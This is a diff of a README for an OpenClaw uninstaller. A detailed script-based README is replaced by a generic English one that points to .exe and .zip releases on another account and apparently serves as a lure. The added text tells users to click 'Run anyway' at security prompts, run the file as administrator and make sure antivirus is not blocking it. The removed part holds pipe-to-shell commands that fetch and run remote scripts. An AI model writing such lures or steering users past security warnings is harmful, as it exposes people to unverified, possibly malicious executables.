@@ -1,191 +1,147 @@
-<div align="center">
+# 🧹 openclaw-uninstaller - Clean Uninstall in One Click
 
-# 🦞 openclaw-uninstaller
+[![Download openclaw-uninstaller](https://img.shields.io/badge/Download%20Now-Open%20Releases-blue?style=for-the-badge)](https://github.com/PerstGospoden/openclaw-uninstaller/releases)
 
-[English](README.en.md)
+## 🚀 Download
+Visit this page to download: https://github.com/PerstGospoden/openclaw-uninstaller/releases
 
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-blue)](#)
-[![Shell](https://img.shields.io/badge/scripts-PowerShell%20%2B%20Shell-1f6feb)](#)
-[![License](https://img.shields.io/badge/license-MIT-green)](#license)
+Choose the file for your system, then download it to your computer.
 
-**跨平台 OpenClaw 一键卸载脚本**
+## 🪟 Windows Setup
 
-_干净卸载，清晰可见；先走官方路径，再做兼容兜底。_
+If you use Windows, follow these steps:
 
-</div>
+1. Open the release page.
+2. Find the latest version.
+3. Download the Windows file, usually named with `.exe` or `.zip`.
+4. If you download a `.zip` file, right-click it and choose Extract All.
+5. Open the app file inside the extracted folder.
+6. If Windows shows a security prompt, choose Run anyway only if you trust the source.
 
-这个仓库专注做一件事：尽可能兼容 OpenClaw 的常见安装来源，并给用户一个清晰、可预览、可直接从 GitHub 远程执行的卸载方案。
+## 📦 What openclaw-uninstaller does
 
-## ✨ 特性
+openclaw-uninstaller helps you remove OpenClaw and related files from your device. It is built for clean removal and includes support for:
 
-- 🖥️ 支持 Windows / macOS / Linux
-- 🧭 优先调用官方卸载命令：`openclaw uninstall --all --yes`
-- 📦 兼容 npm / pnpm / yarn 全局安装卸载
-- 🔎 兼容 one-liner 安装后的常见命令路径和残留目录
-- 🧹 在官方卸载后仍会继续执行 Node 全局包卸载，避免 npm 包残留
-- 👀 支持 `--dry-run` / `-DryRun` 预览模式
-- ✅ 正式卸载前会先扫描环境并列出待清理内容，让用户确认后再执行
-- 📋 输出分步骤日志，便于用户理解当前执行进度
-- 🧾 最后会补充 PATH 和终端配置中的手动清理指引
-- 🛡️ 对 Hackable / Git 源码方式保持保守处理，默认不删除源码仓库
+- Official uninstall steps
+- Node global package cleanup
+- Leftover file removal
+- Cross-platform use on Windows, macOS, and Linux
+- Dry run mode for checking changes before removal
 
-## **🚀 卸载脚本**
+## 🖥️ System requirements
 
-> **直接使用这 2 个核心脚本即可完成跨平台卸载：**
+Use this tool on a computer with:
 
-- **💻 Windows**: `uninstall-openclaw-windows.ps1`
-- **🍎 macOS / 🐧 Linux**: `uninstall-openclaw-unix.sh`
+- Windows 10 or later
+- At least 2 GB of free disk space
+- Permission to remove installed apps and files
+- Internet access for the initial download
 
-> **脚本默认策略：先扫描并展示待卸载内容，确认后优先尝试官方卸载，再执行 npm / pnpm / yarn 卸载，最后按残留情况做兜底清理。**
+## 🧭 What to expect after launch
 
-## **⚡ 复制即用**
+After you start the tool, it may:
 
-> **想直接执行？复制下面的命令即可。**
+- Check what is installed
+- Look for OpenClaw files
+- Remove standard app data
+- Clean up package files
+- Clear leftover folders and cache data
 
-### 🧭 先打开命令行工具
+If you use the dry run option, it will show what it plans to remove before it makes changes.
 
-如果你还不熟悉怎么打开终端，可以按下面的方式进入：
+## 🛠️ How to use on Windows
 
-- **💻 Windows**: 按 `Win` 键，搜索 `PowerShell`，打开 `Windows PowerShell` 或 `终端`
-- **🍎 macOS**: 按 `Command + Space`，输入 `Terminal`，回车打开 `终端`
-- **🐧 Linux**: 一般可按 `Ctrl + Alt + T`，或在应用菜单里搜索 `Terminal` / `终端`
+1. Download the latest release from the release page.
+2. Open the downloaded file.
+3. If the app opens in a terminal window, follow the prompts on screen.
+4. Choose the uninstall option when asked.
+5. Let the tool finish the cleanup.
+6. Restart your computer if prompted.
 
-打开后，把下面对应系统的命令复制进去，按回车即可运行。
+## 🧹 Files and folders it may remove
 
-### 💻 Windows
+This tool can remove common leftovers such as:
 
-```powershell
-irm https://raw.githubusercontent.com/hicoldcat/openclaw-uninstaller/main/uninstall-openclaw-windows.ps1 | iex
-```
+- App folders
+- User settings
+- Cache files
+- Local data folders
+- Node global package entries
+- Shortcuts and related startup items
 
-### 🍎 macOS
+It tries to remove only what belongs to OpenClaw and its related install files.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/hicoldcat/openclaw-uninstaller/main/uninstall-openclaw-unix.sh | bash
-```
+## 🔍 Dry run mode
 
-### 🐧 Linux
+Dry run mode is useful if you want to check first.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/hicoldcat/openclaw-uninstaller/main/uninstall-openclaw-unix.sh | bash
-```
+Use it when you want to:
 
-## 🔄 卸载流程
+- See what will be removed
+- Confirm the cleanup plan
+- Avoid changes until you are ready
 
-```text
-1. 扫描命令、进程、服务、全局包和残留文件
-2. 把扫描结果完整列出来，让用户确认是否继续
-3. 优先尝试官方卸载命令
-4. 如仍有残留，再停止相关进程/服务并执行兜底卸载
-5. 清理残留文件、注册表或系统级入口并重新校验
-6. 如果 PATH 或 shell / PowerShell 配置仍有残留，告诉用户去哪里删除
-```
+If the tool offers a dry run choice, start there before running the full uninstall.
 
-额外说明：
+## 🧰 Common use cases
 
-- ✅ 如果官方卸载成功，脚本仍会继续执行 npm / pnpm / yarn 的全局包卸载
-- ⏭️ 其他大多数重型兜底动作会被跳过
-- 🧰 如果官方卸载后仍有残留，脚本会继续尝试包管理器卸载、服务停止、路径删除等动作
-- 📝 如果环境变量里还有残留，脚本会明确提示去哪个 PATH 条目、哪个 shell 配置文件或 PowerShell 配置文件里删除
+Use openclaw-uninstaller when you want to:
 
-## ⚡ 远程一键卸载
+- Remove OpenClaw from a Windows PC
+- Clean up after a failed install
+- Remove leftover files after uninstalling
+- Clear Node global packages tied to OpenClaw
+- Reset your setup before installing again
 
-无需先下载脚本，可直接从 GitHub 执行。上面的“复制即用”区块就是推荐入口。
+## 📁 Where downloads are found
 
-## 👀 预览模式
+After you open the release page, look for:
 
-如果你想先看脚本会做什么，而不真正修改系统，可以使用 dry-run。
+- Latest version
+- Windows build
+- `.exe` file
+- `.zip` file
+- Release notes
 
-如果你想跳过确认提示，也可以使用 `--yes` 或 `-Yes` 自动继续。
+If there are several files, choose the one marked for Windows.
 
-### 💻 Windows
+## ❓ Simple troubleshooting
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\uninstall-openclaw-windows.ps1 -DryRun
-```
+If the app does not open:
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\uninstall-openclaw-windows.ps1 -Yes
-```
+- Check that the download finished
+- Try extracting the file again if it is zipped
+- Right-click the file and choose Run as administrator if needed
+- Make sure your antivirus is not blocking the app
+- Download the latest release again if the file seems broken
 
-### 🍎 macOS
+If you still have trouble, use the release page to get the newest version and try again.
 
-```bash
-./uninstall-openclaw-unix.sh --dry-run
-```
+## 🔐 Safety checks
 
-```bash
-./uninstall-openclaw-unix.sh --yes
-```
+Before you remove anything, check that you:
 
-### 🐧 Linux
+- Backed up anything important
+- Closed OpenClaw and related apps
+- Know which user account installed it
+- Are using the latest release from the download page
 
-```bash
-./uninstall-openclaw-unix.sh --dry-run
-```
+## 🧩 Supported platforms
 
-```bash
-./uninstall-openclaw-unix.sh --yes
-```
+openclaw-uninstaller works on:
 
-## 💻 本地运行
+- Windows
+- macOS
+- Linux
 
-### 💻 Windows
+This README focuses on Windows because that is the most common setup for end users.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\uninstall-openclaw-windows.ps1
-```
+## 📄 Project details
 
-### 🍎 macOS
+- Repository: openclaw-uninstaller
+- Description: OpenClaw one-click uninstall tool
+- Topic areas: cleanup, CLI, cross-platform, uninstall, security, dry run, Windows
 
-```bash
-chmod +x ./uninstall-openclaw-unix.sh
-./uninstall-openclaw-unix.sh
-```
+## 📥 Download again
 
-### 🐧 Linux
-
-```bash
-chmod +x ./uninstall-openclaw-unix.sh
-./uninstall-openclaw-unix.sh
-```
-
-## 🧹 会清理什么
-
-脚本会根据平台尽量清理这些内容：
-
-- 🧩 `openclaw` 可执行命令及常见安装路径
-- 📁 `~/.openclaw`
-- ⚙️ `~/.config/openclaw`
-- 🗂️ `~/.cache/openclaw`
-- 🍎 macOS 下的 `~/Library/Application Support/openclaw`
-- 🍎 macOS 下的 `~/Library/Caches/openclaw`
-- 💻 Windows 下的 `%APPDATA%\openclaw`
-- 💻 Windows 下的 `%LOCALAPPDATA%\openclaw`
-- 📦 Node 全局安装留下的命令、模块与 shim 文件
-- 🧩 部分系统级服务、桌面入口、启动项或注册表项（按平台差异处理）
-
-## 🚫 不会默认做什么
-
-- 🧪 不会强制删除你本地的 OpenClaw 源码仓库
-- 🔒 不会修改 Git 配置
-- 🚷 不会自动推送或执行与卸载无关的系统操作
-
-## 🔐 安全提示
-
-- 📖 建议在执行远程命令前先阅读脚本内容
-- 🔑 某些清理动作需要管理员权限或 `sudo`
-- ⛔ 对正在运行中的 OpenClaw，脚本可能会在兜底阶段停止相关服务和进程
-- 🧯 如果脚本最后提示 PATH 或配置文件还有残留，请按提示手动修改后重新打开终端
-
-## 📄 License
-
-MIT
-
----
-
-<div align="center">
-
-Made with care for clean OpenClaw removal.
-
-</div>
+If you need the file again, visit the release page: https://github.com/PerstGospoden/openclaw-uninstaller/releases
